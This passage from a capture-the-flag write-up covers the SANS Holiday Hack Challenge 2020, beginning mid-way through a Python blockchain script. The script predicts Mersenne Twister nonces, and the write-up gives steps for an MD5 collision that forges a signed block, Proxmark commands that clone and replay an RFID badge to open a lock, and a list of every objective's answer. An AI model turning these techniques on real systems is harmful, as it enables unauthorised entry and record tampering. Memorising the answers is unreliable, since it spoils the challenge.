video', 11:'MOV video', 12:'WMV video', 13:'FLV video', 14:'AVI video', 255:'Binary blob'} data\\_extension = {1:'txt', 2:'jpg', 3:'bmp', 4:'gif', 5:'pdf', 6:'docx', 7:'pptx', 8:'xlsx', 9:'tiff', 10:'mp4', 11:'mov', 12:'wmv', 13:'flv', 14:'avi', 255:'bin'} Naughty = 0 Nice = 1 class Block(): def \\_\\_init\\_\\_(self, index=None, block\\_data=None, previous\\_hash=None, load=False, genesis=False): if(genesis == True): return None else: self.data = \\[\\] if(load == False): if all(p is not None for p in \\[index, block\\_data\\['documents'\\], block\\_data\\['pid'\\], block\\_data\\['rid'\\], block\\_data\\['score'\\], block\\_data\\['sign'\\], previous\\_hash\\]): self.index = index if self.index == 0: self.nonce = 0 # genesis block else: self.nonce = random.randrange(0xFFFFFFFFFFFFFFFF) self.data = block\\_data\\['documents'\\] self.previous\\_hash = previous\\_hash self.doc\\_count = len(self.data) self.pid = block\\_data\\['pid'\\] self.rid = block\\_data\\['rid'\\] self.score = block\\_data\\['score'\\] self.sign = block\\_data\\['sign'\\] now = time.gmtime() self.month = now.tm\\_mon self.day = now.tm\\_mday self.hour = now.tm\\_hour self.minute = now.tm\\_min self.second = now.tm\\_sec self.hash, self.sig = self.hash\\_n\\_sign() else: return None def \\_\\_eq\\_\\_(self, other): if isinstance(other, self.\\_\\_class\\_\\_): return self.\\_\\_dict\\_\\_ == other.\\_\\_dict\\_\\_ else: return False def \\_\\_repr\\_\\_(self): s = 'Chain Index: %i\\\\n' % (self.index) s += ' Nonce: %s\\\\n' % ('%016.016x' % (self.nonce)) s += ' PID: %s\\\\n' % ('%016.016x' % (self.pid)) s += ' RID: %s\\\\n' % ('%016.016x' % (self.rid)) s += ' Document Count: %1.1i\\\\n' % (self.doc\\_count) s += ' Score: %s\\\\n' % ('%08.08x (%i)' % (self.score, self.score)) n\\_n = 'Naughty' if self.sign > 0: n\\_n = 'Nice' s += ' Sign: %1.1i (%s)\\\\n' % (self.sign, n\\_n) c = 1 for d in self.data: s += ' Data item: %i\\\\n' % (c) s += ' Data Type: %s (%s)\\\\n' % ('%02.02x' % (d\\['type'\\]), data\\_types\\[d\\['type'\\]\\]) s += ' Data Length: %s\\\\n' % ('%08.08x' % (d\\['length'\\])) s += ' Data: %s\\\\n' % (binascii.hexlify(d\\['data'\\])) c += 1 s += ' Date: %s/%s\\\\n' % ('%02.02i' % (self.month), '%02.02i' % (self.day)) s += ' Time: %s:%s:%s\\\\n' % ('%02.02i' % (self.hour), '%02.02i' % (self.minute), '%02.02i' % (self.second)) s += ' PreviousHash: %s\\\\n' % (self.previous\\_hash) s += ' Data Hash to Sign: %s\\\\n' % (self.hash) s += ' Signature: %s\\\\n' % (self.sig) return(s) def full\\_hash(self): hash\\_obj = MD5.new() hash\\_obj.update(self.block\\_data\\_signed()) return hash\\_obj.hexdigest() def hash\\_n\\_sign(self): hash\\_obj = MD5.new() hash\\_obj.update(self.block\\_data()) signer = PKCS1\\_v1\\_5.new(private\\_key) return (hash\\_obj.hexdigest(), b64encode(signer.sign(hash\\_obj))) def block\\_data(self): s = (str('%016.016x' % (self.index)).encode('utf-8')) s += (str('%016.016x' % (self.nonce)).encode('utf-8')) s += (str('%016.016x' % (self.pid)).encode('utf-8')) s += (str('%016.016x' % (self.rid)).encode('utf-8')) s += (str('%1.1i' % (self.doc\\_count)).encode('utf-8')) s += (str(('%08.08x' % (self.score))).encode('utf-8')) s += (str('%1.1i' % (self.sign)).encode('utf-8')) for d in self.data: s += (str('%02.02x' % d\\['type'\\]).encode('utf-8')) s += (str('%08.08x' % d\\['length'\\]).encode('utf-8')) s += d\\['data'\\] s += (str('%02.02i' % (self.month)).encode('utf-8')) s += (str('%02.02i' % (self.day)).encode('utf-8')) s += (str('%02.02i' % (self.hour)).encode('utf-8')) s += (str('%02.02i' % (self.minute)).encode('utf-8')) s += (str('%02.02i' % (self.second)).encode('utf-8')) s += (str(self.previous\\_hash).encode('utf-8')) return(s) def block\\_data\\_signed(self): s = self.block\\_data() s += bytes(self.hash.encode('utf-8')) s += self.sig return(s) def load\\_a\\_block(self, fh): self.index = int(fh.read(16), 16) self.nonce = int(fh.read(16), 16) self.pid = int(fh.read(16), 16) self.rid = int(fh.read(16), 16) self.doc\\_count = int(fh.read(1), 10) self.score = int(fh.read(8), 16) self.sign = int(fh.read(1), 10) count = self.doc\\_count while(count > 0): l\\_data = {} l\\_data\\['type'\\] = int(fh.read(2),16) l\\_data\\['length'\\] = int(fh.read(8), 16) l\\_data\\['data'\\] = fh.read(l\\_data\\['length'\\]) self.data.append(l\\_data) count -= 1 self.month = int(fh.read(2)) self.day = int(fh.read(2)) self.hour = int(fh.read(2)) self.minute = int(fh.read(2)) self.second = int(fh.read(2)) self.previous\\_hash = str(fh.read(32))\\[2:-1\\] self.hash = str(fh.read(32))\\[2:-1\\] self.sig = fh.read(344) return self def create\\_genesis\\_block(self): block\\_data = {} documents = \\[\\] doc = {} doc\\['data'\\] = bytes('Genesis Block'.encode('utf-8')) doc\\['type'\\] = 1 doc\\['length'\\] = len(doc\\['data'\\]) documents.append(doc) block\\_data\\['documents'\\] = documents block\\_data\\['pid'\\] = 0 block\\_data\\['rid'\\] = 0 block\\_data\\['score'\\] = 0 block\\_data\\['sign'\\] = Nice b = Block(0, block\\_data, genesis\\_block\\_fake\\_hash) return b def verify\\_types(self): # check data types of all info in a block rv = True instances = \\[self.index, self.nonce, self.pid, self.rid, self.month, self.day, self.hour, self.minute, self.second, self.previous\\_hash, self.score, self.sign\\] types = \\[int, int, int, int, int, int, int, int, int, str, int, int\\] if not sum(map(lambda inst\\_, type\\_: isinstance(inst\\_, type\\_), instances, types)) == len(instances): rv = False for d in self.data: if not isinstance(d\\['type'\\], int): rv = False if not isinstance(d\\['length'\\], int): rv = False if not isinstance(d\\['data'\\], bytes): rv = False return rv def dump\\_doc(self, doc\\_no): filename = '%s.%s' % (str(self.index), data\\_extension\\[self.data\\[doc\\_no - 1\\]\\['type'\\]\\]) with open(filename, 'wb') as fh: d = self.data\\[doc\\_no - 1\\]\\['data'\\] fh.write(d) print('Document dumped as: %s' % (filename)) class Chain(): nonce\\_list = \\[\\] index = 0 initial\\_index = 0 last\\_hash\\_value = '' def \\_\\_init\\_\\_(self, load=False, filename=None): if not load: self.blocks = \\[Block(genesis=True).create\\_genesis\\_block()\\] self.last\\_hash\\_value = self.blocks\\[0\\].full\\_hash() else: self.blocks = \\[\\] self.load\\_chain(filename) self.index = self.blocks\\[-1\\].index self.initial\\_index = self.blocks\\[0\\].index def \\_\\_eq\\_\\_(self, other): if isinstance(other, self.\\_\\_class\\_\\_): return self.\\_\\_dict\\_\\_ == other.\\_\\_dict\\_\\_ else: return False def add\\_block(self, block\\_data): self.index += 1 b = Block(self.index, block\\_data, self.last\\_hash\\_value) self.blocks.append(b) self.last\\_hash\\_value = b.full\\_hash() def verify\\_chain(self, publickey, previous\\_hash=None): flag = True # unless we're explicitly told what the initial last hash should be, we assume that # the initial block will be the genesis block and will have a fixed previous\\_hash if previous\\_hash is None: previous\\_hash = genesis\\_block\\_fake\\_hash for i in range(0, len(self.blocks)): # assume Genesis block integrity block\\_no = self.blocks\\[i\\].index if not self.blocks\\[i\\].verify\\_types(): flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong data type(s) at block {block\\_no}.') if self.blocks\\[i\\].index != i + self.initial\\_index: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong block index at what should be block {i + self.initial\\_index}: {block\\_no}.') if self.blocks\\[i\\].previous\\_hash != previous\\_hash: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Wrong previous hash at block {block\\_no}.') hash\\_obj = MD5.new() hash\\_obj.update(self.blocks\\[i\\].block\\_data()) signer = PKCS1\\_v1\\_5.new(publickey) if signer.verify(hash\\_obj, b64decode(self.blocks\\[i\\].sig)) is False: flag = False print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Bad signature at block {block\\_no}.') if flag == False: print(f'\\\\n\\*\\*\\* WARNING \\*\\*\\* Blockchain invalid from block {block\\_no} onward.\\\\n') return False previous\\_hash = self.blocks\\[i\\].full\\_hash() return True def save\\_a\\_block(self, index, filename=None): if filename is None: filename = 'block.dat' with open(filename, 'wb') as fh: fh.write(self.blocks\\[index\\].block\\_data\\_signed()) def save\\_chain(self, filename=None): if filename is None: filname = 'blockchain.dat' with open(filename, 'wb') as fh: i = 0 while(i < len(self.blocks)): fh.write(self.blocks\\[i\\].block\\_data\\_signed()) i += 1 def load\\_chain(self, filename=None): count = 0 if filename is None: filename = 'blockchain.dat' with open(filename, 'rb') as fh: while(1): try: self.blocks.append(Block(load=True).load\\_a\\_block(fh)) self.index = self.blocks\\[-1\\].index count += 1 except ValueError: return count if \\_\\_name\\_\\_ == '\\_\\_main\\_\\_': with open('private.pem', 'rb') as fh: private\\_key = RSA.importKey(fh.read()) public\\_key = private\\_key.publickey() c1 = Chain() for i in range(9): block\\_data = {} documents = \\[\\] doc = {} doc\\['data'\\] = bytes(('This is block %i of the naughty/nice blockchain.' % (i)).encode('utf-8')) doc\\['type'\\] = 1 doc\\['length'\\] = len(doc\\['data'\\]) documents.append(doc) block\\_data\\['documents'\\] = documents block\\_data\\['pid'\\] = 123 # this is the pid, or \"person id,\" that the block is about block\\_data\\['rid'\\] = 456 # this is the rid, or \"reporter id,\" of the reporting elf block\\_data\\['score'\\] = 100 # this is the Naughty/Nice score of the report block\\_data\\['sign'\\] = Nice # this indicates whether the report is about naughty or nice behavior c1.add\\_block(block\\_data) print(c1.blocks\\[3\\]) print('C1: Block chain verify: %s' % (c1.verify\\_chain(public\\_key))) #Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat # with open('official\\_public.pem', 'rb') as fh: official\\_public\\_key = RSA.importKey(fh.read()) c2 = Chain(load=True, filename='blockchain.dat') print('C2: Block chain verify: %s' % (c2.verify\\_chain(official\\_public\\_key))) print(c2.blocks\\[0\\]) c2.blocks\\[0\\].dump\\_doc(1) predictor = MT19937Predictor() nonce\\_list= \\[\\] # Adding all the nonces of all the blocks in a list for i in range(len(c2.blocks)): nonce\\_list.append(c2.blocks\\[i\\].nonce) # reeversing the list nonce\\_list.reverse() # get the first 625 nonces last\\_625\\_block\\_nonce = list(itertools.islice(nonce\\_list,625)) # reverse the list so we get the last 625 nonces last\\_625\\_block\\_nonce.reverse() # Setting the data for 625 nonces to the MT19937Predictor for nonce in last\\_625\\_block\\_nonce: predictor.setrandbits(nonce, 64) # calcutated nonce and added for block 12997 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(13205885317093879758,64) # calculated nonce and added for block 12998 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(109892600914328301,64) # calculated nonce and added for block 12999 \\[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\\] predictor.setrandbits(9533956617156166628,64) # Get the nonce for block 13000 print(predictor.getrandbits(64)) Determine and extract the original naughty document: Below is part of the 129459.pdf - Jack\u2019s document (obviously a nice one!) Nice document for Jack Frost Open the file 129549.pdf in an online hex editor [ https://hexed.it/ ] and make changes (See right side) Ref: https://speakerdeck.com/ange/colltris?slide=194 PDF which Jack Frost had (left, the nice list) and the recovered PDF (right, the naughty list) Save the changes as a different PDF file. Open and you see the different PDF \u2013 the naughty list, the original one meant for Jack Frost. The naughty list for Jack Frost Determine the flag for naughty/nice in the Jack\u2019s block : Open the Jack\u2019s block file in online hex editor and compare the text version of the block to find the nice/naughty flag. Jake must have changed this from 0 (original which means naughty) to 1 (nice). The position of the naughty nice flag in the hex for the PDF Determine 3rd and 4th byte which were changed by Jake : At this point, we have two bytes identified \u2013 one for the PDF page number and another for nice/naughty flag. The 3rd and 4th bytes identified Following the Unicoll computation technique as noted in https://speakerdeck.com/ange/colltris?slide=109 The 1st byte \u2013 This is the nice/naughty flag we decreased by 1 (31 to 30) The 2ndByte \u2013 This would be the 10th byte of the next block which we need to increase by 1 (D6 to D7) The 3rd Byte \u2013 This is the PDF page number which we increased by 1 (32 to 33) The 4th Byte \u2013 This would be the 10th byte of the next block which we need to decrease by 1 (1C to 1B) Please see the screenshot below for the all changes: left side is Jake's block (block.dat) right side is original block which Jake changed (block_restored.dat) - changes in bytes noted below. Jack's block (left) and original block restored which Jack changed (right) - remember , the MD5 for both is still same! Jake was able to change the original block without changing the hash. His block\u2019s MD5 has was b10b4a6bd373b61f32f4fd3a0cdfbf84 We needed to undo his changes and restore the original block, without changing the MD5 hash. As you can see with the below changes, the hashes still don\u2019t change. MD5 Hash of Jake's block (block.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84 MD5 Hash of Jake's block (block.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84 MD5 Hash of original block (block_restored.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84 MD5 Hash of original block which Jack modified (block_restored.dat) - b10b4a6bd373b61f32f4fd3a0cdfbf84 Now we just need to save the changes in a new file block_restored.dat and calculate the SHA256 hash of it. SHA256 of the block_restored.dat fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb SHA256 of the restored block - fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb The below zip file contains the changed naughty_nice.py (please remove .txt after extraction) 11b_naughty_nice_changed.py Download All objectives are completed now All narratives have been unlocked The best part! After completing all the objectives, you go to Santa's office. Tinsel Upatree says \"Quickly go out to the balcony to be recognized\"!! You go the roof and and congratulations are in order!!!! Jack's plan is foiled! The exclusive winner hoodie : I got myself the exclusive Holiday Hack challenge 2020 winner hoodie!","title":"SANS Holiday Hack Challenge 2020 (KringleCon 3) Write-up"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#sans-holiday-hack-challenge-2020-kringlecon-3-write-up","text":"Holiday Hack Challenge is a CTF challenge organized by SANS and Counter Hack during Christmas each year. This year the CTF was named \u201cKringleCon 3: French Hens\u201d. It had total 12 objectives and 12 terminals. Those 12 objectives tested hacking skillsets using Python, Javascript, Network security, Cryptography etc. As you progressed, the difficulty level of the objectives increased. It was a mind-numbing and awesome experience to complete all those objectives. Below is the write-up of those objectives including the answers.","title":"SANS Holiday Hack Challenge 2020 (KringleCon 3) Write-up"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#all-answers","text":"Objective Answer Objective 1: Uncover Santa\u2019s Gift List Proxmark Objective 2: Investigate the S3 bucket North Pole: The Frostiest Place on Earth Objective 3: Point-of-sale Password Recovery santapass Objective 4: Operate the Santavator No answer. This needed to be solved using Javascript by manipulating the position of objects. Objective 5 : Open HID Block No answer. This needed to be solved using the Proxmark CLI. Objective 6: Splunk Challenge Training Question 1 13 Objective 6: Splunk Challenge Training Question 2 t1059.003-main t1059.003-win Objective 6: Splunk Challenge Training Question 3 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Objective 6: Splunk Challenge Training Question 4 2020-11-30T17:44:15Z Objective 6: Splunk Challenge Training Question 5 3648 Objective 6: Splunk Challenge Training Question 6 quser Objective 6: Splunk Challenge Training Question 7 55FCEEBB21270D9249E86F4B9DC7AA60 Objective 6: Splunk Challenge The challenge question The Lollipop Guild CAN Bus Problem This is was the prerequisite for Objective 7 : Solve the Sleigh\u2019s CAN-D-BUS Problem 122520 Objective 8: Broken Tag Generator JackFrostWasHere Objective 9: ARP Shenanigans Tanta Kringle Objective 10: Defeat Fingerprint Sensor No answer. This needed bypassing the \"Santa\" check using Javascript and Fiddler Objective 11a): Naughty/Nice List with Blockchain Investigation Part 57066318F32F729D Objective 11b): Naughty/Nice List with Blockchain Investigation Part 2 fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"All Answers"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-1-uncover-santas-gift-list","text":"There is a photo of Santa's Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.","title":"Objective 1 : Uncover Santa's Gift List"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer","text":"Proxmark","title":"Answer"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process","text":"1) Downloaded the photograph. 2) Cropped the photo with only the gift list. 3) Installed Gimp 4) Used Filter > Distort > Whirl and Pinch 5) Unwirl to find the answer","title":"Process"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#original-billboard-image","text":"","title":"Original billboard image :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#unwirled-image-to-find-the-item","text":"","title":"Unwirled Image to find the item :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-2-investigate-the-s3-bucket","text":"When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.","title":"Objective 2: Investigate the S3 bucket"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer_1","text":"North Pole: The Frostiest Place on Earth","title":"Answer"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_1","text":"Using bucket_finder.rb s3 bucket \"wrapper3000\" was downloaded and extracted. This folder has a file named 'package' which has base64 encoded string Below is the process of unwrapping process of \u2018package\u2019 file all the way to the text file: wrapper3000/package > base64 decode > zip file > .bz2 file > .tar file > .xxd file > .xz file > .z file > ASCII text file. #!/bin/bash -x # Author : Ashish Gupta # Below will download the s3 bucket and will keep unwap till we find a text file # The downloaded and extracted folder \"wrapper\" has this file named 'package' which has base64 encoded string # Unrapping process : # wrapper3000/package > base64 decode > zip file > .bz2 file > .tar file > .xxd file > .xz file > .z file > ASCII text file # # Assuming we are on home, this will show the items TIPS bucket\\_finder ls # Go to bucket\\_finder cd bucket\\_finder/ # Check what is currently in the wordlist cat wordlist # Append wrapper3000 to the wordlist echo wrapper3000 >> wordlist # Check to make sure wrapper3000 is appended to the wordlist cat wordlist # Search for s3 buckets with names noted in the 'wordlist' file and if found download them # Below will download the file named 'package' ./bucket\\_finder.rb wordlist -d # change to downloaded wrapper3000/ directory cd wrapper3000 # Check to make sure a file named 'package' exists ls # What kind of file is 'package' # Below will show \"package: ASCII text, with very long lines\" file package # May be a base64 file. decode it to a file named 'myfile' cat package | base64 -d > myfile # What kind of file is myfile # Below will show \"myfile: Zip archive data, at least v1.0 to extract\" # So, myfile is a zip. extract using unzip. # Below will extract to a .bz2 file printing the below #Archive: myfile # extracting: package.txt.Z.xz.xxd.tar.bz2 unzip myfile # What kind of file is \"package.txt.Z.xz.xxd.tar.bz2\" # Below will show a bz2 file named \"package.txt.Z.xz.xxd.tar.bz2\" printing the below : # package.txt.Z.xz.xxd.tar.bz2: bzip2 compressed data, block size = 900k file package.txt.Z.xz.xxd.tar.bz2 # Its bz2 file, extract using bzip2 # Below will extract the bz2 file to another file named \"package.txt.Z.xz.xxd.tar\" bzip2 -d package.txt.Z.xz.xxd.tar.bz2 # We have now package.txt.Z.xz.xxd.tar # What kind of file is \"package.txt.Z.xz.xxd.tar\" # below will show .tar printing below : # package.txt.Z.xz.xxd.tar: POSIX tar archive file package.txt.Z.xz.xxd.tar # Extract the tar file. It will extract to package.txt.Z.xz.xxd tar -xvf package.txt.Z.xz.xxd.tar # What kind of file is \"package.txt.Z.xz.xxd\" # package.txt.Z.xz.xxd: ASCII text file package.txt.Z.xz.xxd # use xxd on this to extract to test2.xz xxd -r package.txt.Z.xz.xxd test2.xz # What kind of file is \"test2.xz\" # test2.xz: XZ compressed data file test2.xz # uncompress test2.xz using xz which will extract the file named \"test2\" unxz test2.xz # rename file test2 to test2.z mv test2 test2.z # uncompress test2.z. this will create a file named \"test2\" uncompress test2.z # What kind of file is \"test2\" # test2: ASCII text file test2 # Print the contents of this text file # Output would show \"North Pole: The Frostiest Place on Earth\" cat test2","title":"Process"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-3-point-of-sale-password-recovery","text":"Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password?","title":"Objective 3: Point-of-sale Password Recovery"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-santapass","text":"","title":"Answer : santapass"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_2","text":"Step 1: Extract the santa-shop.exe using 7zip. You see the ASAR file. Step 2: Extract the source code from ASAR application and find the password in main.js","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-4-operate-the-santavator","text":"Talk to Pepper Minstix in the entryway to get some hints about the Santavator.","title":"Objective 4: Operate the Santavator"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_3","text":"Use the chrome JS console to rotate the green light and candycane so we can get lights to all the outlets. a = document.querySelector(\"body > div.box-parent > div.item.light.greenlight\") a.style.transform = \"rotate(-45deg)\" candy = document.querySelector(\"body > div.box-parent > div.item.item.candycane\") candy.style.transform=\"rotate(-10deg)\"","title":"Process"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-5-open-hid-block","text":"Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.","title":"Objective 5 : Open HID Block"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#copy-the-badge-id-from-elf-bow-ninecandle","text":"Go near Bow Ninecandle in teh \"Talks\" floor. Open the Proxmark3 CLI from the \"Items\" menu Copy the badge value from Bow Ninecandle using the below command : lf hid read The tag id is 2006e22f0e","title":"Copy the badge id from elf Bow Ninecandle"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#use-the-copied-tag-id-to-unlock-the-door-in-workshop-room","text":"Go to the workshop floor and stand in front of the lock. Open Proxmark CLI and simulate the tag id \"2006e22f0e\" of Bow Ninecandle lf hid sim -r 2006e22f0e The door is unlocked!!! When you enter the room you just unlocked, Its all dark with light at the end. You approach it...... and you become Santa!!! This was a magical moment for me!","title":"Use the copied tag id to unlock the door in workshop room"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#objective-6-splunk-challenge","text":"Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?","title":"Objective 6: Splunk Challenge"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#splunk-training-question-1","text":"How many distinct MITRE ATT&CK techniques did Alice emulate?","title":"Splunk Training question 1"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-13","text":"","title":"Answer : 13"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_4","text":"Execute the below Splunk query : | tstats count where index=t* by index | eval results=split(index,\"-\") | eval without-dash=mvindex(results,0) | table without-dash | rex field=without-dash mode=sed \"s/\\..*$//\" | dedup without-dash OR | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(? t\\d+)[\\.\\-].0*\" | stats dc(technique)","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#splunk-training-question-2","text":"What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space)","title":"Splunk Training Question 2 :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-t1059003-main-t1059003-win","text":"","title":"Answer : t1059.003-main t1059.003-win"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_5","text":"Execute the below Splunk query: index=t1059.003* | table index | dedup index | sort index","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#output","text":"","title":"Output :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#splunk-training-question-3","text":"One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?","title":"Splunk Training Question 3 :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-hkey_local_machinesoftwaremicrosoftcryptography","text":"","title":"Answer: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_6","text":"\"System Information Discovery\" is technique T1082 https://attack.mitre.org/techniques/T1082/ Note per the question, a registry key was queried, so execute the below Splunk query on the all the indexes for the technique t1082 for \u201creg\u201d to get the registry key which was queried, since the \u201cMachineGuid\u201d needed to be determined, It must have been part of the query, so included that as well in the Splunk query: index=t1082* reg machineguid CommandLine!='' | table CommandLine","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#output_1","text":"","title":"Output :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#splunk-training-question-4","text":"According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)","title":"Splunk Training Question 4"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-2020-11-30t174415z","text":"","title":"Answer: 2020-11-30T17:44:15Z"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_7","text":"1) Go to the Atomic test GitHub page https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md 2) Look for \"OSTAP\". 3) Execute the below Splunk query on the \u201cattack\u201d index to get the 1st OSAT related text executed. index=attack OSTAP | table \"Execution Time _UTC\" | sort \"Execution Time _UTC\" asc","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#splunk-training-question-5","text":"One Atomic Red Team test executed by the Attack Range makes use of an open-source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?","title":"Splunk Training Question 5"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-3648","text":"","title":"Answer : 3648"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_8","text":"1) First look up what projects were authored by frgnca https://github.com/frgnca 2) Search in the attack index with the above projects one by one and you get a hit on \"audio\" index=attack audio We get a hit on this with technique# T1123 3) Confirmed the T1123 does make use of the project \"AudioDeviceCmdlets\" https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md 4) Now pivot to index for the technique T1123 for the \"audio\" and the Sysmon as source with TimeCreated as time. Note that \u201ctail 1\u201d is used as the ask is to get the process id associated with the \u201cfirst use\u201d. \u201ctail 1\u201d will provide the 1st record (1st use) as Splunk returns the search results sorted so that the latest result comes first. index=t1123* EventCode=1 *audio* source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" | tail 1 | table TimeCreated, process_id, CommandLine, *","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#splunk-training-question-6","text":"Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?","title":"Splunk Training Question 6"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-quser","text":"","title":"Answer : quser"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#process_9","text":"1) Let\u2019s find which techniques uses the Windows Registry run keys. Go to https://mitre-attack.github.io/attack-navigator/v3/enterprise/ and search for \"run\" and \"view\" the 1st result Its Technique# T1447 Windows registry run keys https://attack.mitre.org/techniques/T1547/001/ 2) Search index t1547 for the sysmon logs for technique with bat index=t1547* \"*bat*\" source=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" CommandLine!='' | table CommandLine There are two bat files batstartup.bat (stored local) and Discovery.bat (on Github) Please click on the image to see the larger version. The batch file location appears very small in the above screenshot so listing them out below: 1) $env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\\ 2) https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat Sysmon logs can\u2019t have the source code of the batstartup.bat. But look at the second one. It\u2019s on GitHub. https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat Just go to that URL and the last line of that batch file is \u201cquser\u201d","title":"Process :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#splunk-training-question-7","text":"According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?","title":"Splunk Training Question 7 :"},{"location":"2021/01/2021-01-17-sans-holiday-hack-challenge-2020-kringlecon-3-write-up/#answer-55fceebb21270d9249e86f4b9dc7aa60","text":"","title":"Answer : 